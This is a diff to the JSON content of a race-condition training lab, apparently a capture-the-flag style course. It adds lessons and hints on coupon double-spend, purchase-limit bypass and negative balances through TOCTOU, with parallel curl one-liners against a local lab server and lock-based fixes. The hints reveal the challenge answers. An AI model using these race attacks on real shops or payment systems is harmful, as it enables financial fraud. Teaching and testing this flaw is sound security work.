@@ -4,18 +4,38 @@
   "tasks": {
     "1": {
       "title": "TOCTOU and coupon double-spend",
+      "body": "## The check-then-act pattern\n\nThe vulnerable endpoint does this:\n\n```python\n# CHECK — has the coupon already been used?\nif uses >= coupon['max_uses']:\n    return error('coupon already used')\n\ntime.sleep(0.1)   # race window: \"database latency\"\n\n# ACT — increment the use count and add to the balance\nstate['coupon_uses'][code] += 1\nstate['balance'] += coupon['value']\n```\n\nIf two requests arrive **within the 0.1s window**, both read\n`uses = 0`, both pass the check, and both redeem. The single-use coupon\ngets redeemed twice. That is a **double-spend**.\n\n## Check that sequential does NOT work\n\n```bash\n# Start the lab first (see the lab panel above).\n# Sequential version — one at a time:\nfor i in $(seq 1 15); do curl -s \"http://127.0.0.1:18099/redeem?code=WELCOME10\"; done | tail -3\n# It always ends with: {\"error\": \"coupon already used\", \"uses\": 1}\n\ncurl -s http://127.0.0.1:18099/reset   # resets the state so you can retry\n```\n\nEach request waits for the previous one: the second request's check already sees the\nfirst one's increment. No concurrency, no race.\n\n## The parallel attack\n\n```bash\ncurl -s http://127.0.0.1:18099/reset > /dev/null\n\n# 15 SIMULTANEOUS requests (the & sends them to the background, wait collects them):\nfor i in $(seq 1 15); do curl -s \"http://127.0.0.1:18099/redeem?code=WELCOME10\" & done; wait\n\ncurl -s http://127.0.0.1:18099/status\n# \"coupon_uses\": {\"WELCOME10\": 9}  ← a single-use coupon, redeemed 9 times\n```\n\nWith real pentest tooling this is done with **Turbo Intruder**\n(a Burp Suite extension, thousands of requests per second) or with the\n`-P` mode of `curl_parallel`, but bash's `for + & + wait` is enough\nhere: what matters is that the requests **overlap within the window**.\n\n## The safe version\n\n```bash\ncurl -s \"http://127.0.0.1:18099/redeem-safe?code=MEGA50\"   # ok, uses: 1\ncurl -s \"http://127.0.0.1:18099/redeem-safe?code=MEGA50\"   # 409: already used\n```\n\n`/redeem-safe` performs the check and the act **inside the same lock**\n(`with lock:`), which makes the sequence atomic. The only difference between\nvulnerable and safe is where the lock starts — that is the whole lesson.",
       "questions": {
-        "race-condition-t01-q01": { "prompt": "What acronym describes the check-then-act vulnerability (check one thing, use another)?" },
-        "race-condition-t01-q02": { "prompt": "Redeem WELCOME10 with 15 SEQUENTIAL requests (one after another). How many uses does the server record at the end? (check /status)" },
-        "race-condition-t01-q03": { "prompt": "Now fire 15 PARALLEL requests at /redeem?code=WELCOME10. Submit the DOUBLE_SPEND achievement flag." }
+        "race-condition-t01-q01": {
+          "prompt": "What acronym describes the check-then-act vulnerability (check one thing, use another)?",
+          "hint": "Time-Of-Check To Time-Of-Use"
+        },
+        "race-condition-t01-q02": {
+          "prompt": "Redeem WELCOME10 with 15 SEQUENTIAL requests (one after another). How many uses does the server record at the end? (check /status)",
+          "hint": "Sequentially there is no race: the 2nd request's check already sees the 1st one's use"
+        },
+        "race-condition-t01-q03": {
+          "prompt": "Now fire 15 PARALLEL requests at /redeem?code=WELCOME10. Submit the DOUBLE_SPEND achievement flag.",
+          "hint": "for i in $(seq 1 15); do curl 'http://127.0.0.1:18099/redeem?code=WELCOME10' & done; wait — the flag appears when uses >= 5"
+        }
       }
     },
     "2": {
       "title": "Limit bypass and negative balance",
+      "body": "## The daily limit that can't survive 30 requests\n\n`/buy` checks the limit of 3 purchases per day before charging. The server\nhas a hard barrier: it rejects with 429 any request that sees\n`purchases >= 13`. Ask it for 20 **sequential** purchases and you will be stopped there,\nwith no flag.\n\nBut during the race window, dozens of threads have already passed the check\nwith `purchases = 3` and are \"in flight\". When they land, the counter\njumps **past the barrier** — a value that no sequential request\ncould ever reach:\n\n```bash\ncurl -s http://127.0.0.1:18099/reset > /dev/null\nfor i in $(seq 1 30); do curl -s \"http://127.0.0.1:18099/buy\" & done; wait\ncurl -s http://127.0.0.1:18099/status   # purchases: 20 (the barrier was 13)\n```\n\nIn a real e-commerce site this bug gives products away: the \"1 per\ncustomer\" limit of a Black Friday promo evaporates with a script.\n\n## The balance check lies too\n\n`/checkout` pays after a seemingly reasonable check:\n\n```python\nif state['balance'] < price:      # CHECK: can they pay?\n    return error('insufficient balance')\ntime.sleep(0.2)                   # \"payment gateway\" — race window\nstate['balance'] -= price         # ACT: charge\n```\n\nSequentially it is impossible to get past: the balance drops 5 at a time down to 0 and\nthe next request sees `balance = 0 < 5` and gets a 402. But fire 30\nparallel requests and **all of them** run the check against the same stale balance\n(100), all of them pass, and all of them charge:\n\n```bash\ncurl -s http://127.0.0.1:18099/reset > /dev/null\nfor i in $(seq 1 30); do curl -s \"http://127.0.0.1:18099/checkout\" & done; wait\ncurl -s http://127.0.0.1:18099/status   # balance: -50\n```\n\nNegative balance: the store paid you. This exact pattern\n(double charging in payment gateways) is the classic case study of race\nconditions with direct financial impact.\n\n## How to really fix it\n\n1. **Atomicity**: check and act inside the same transaction\n   (`SELECT ... FOR UPDATE` in SQL, `with lock:` in Python,\n   `sync.Mutex` in Go).\n2. **Idempotent operations**: retrying a payment must not charge twice\n   (Stripe's idempotency keys).\n3. **Database constraints**: `CHECK (balance >= 0)` and\n   `UNIQUE(coupon_code)` — the last wall, which holds even if the\n   application code gets it wrong.",
       "questions": {
-        "race-condition-t02-q01": { "prompt": "What Python primitive does /buy-safe use to make check and act atomic?" },
-        "race-condition-t02-q02": { "prompt": "Break the daily purchase limit (max 3) until purchases > 13. Submit the LIMIT_BYPASS achievement flag." },
-        "race-condition-t02-q03": { "prompt": "Drive the balance negative by exploiting /checkout. Submit the NEGATIVE_BALANCE achievement flag." }
+        "race-condition-t02-q01": {
+          "prompt": "What Python primitive does /buy-safe use to make check and act atomic?",
+          "hint": "with ____: — the same one /redeem-safe uses"
+        },
+        "race-condition-t02-q02": {
+          "prompt": "Break the daily purchase limit (max 3) until purchases > 13. Submit the LIMIT_BYPASS achievement flag.",
+          "hint": "30+ parallel requests to /buy. Sequentially you get stopped at 13; only the threads in flight inside the window get past it"
+        },
+        "race-condition-t02-q03": {
+          "prompt": "Drive the balance negative by exploiting /checkout. Submit the NEGATIVE_BALANCE achievement flag.",
+          "hint": "for i in $(seq 1 30); do curl 'http://127.0.0.1:18099/checkout' & done; wait — the balance check suffers from TOCTOU"
+        }
       }
     }
   }
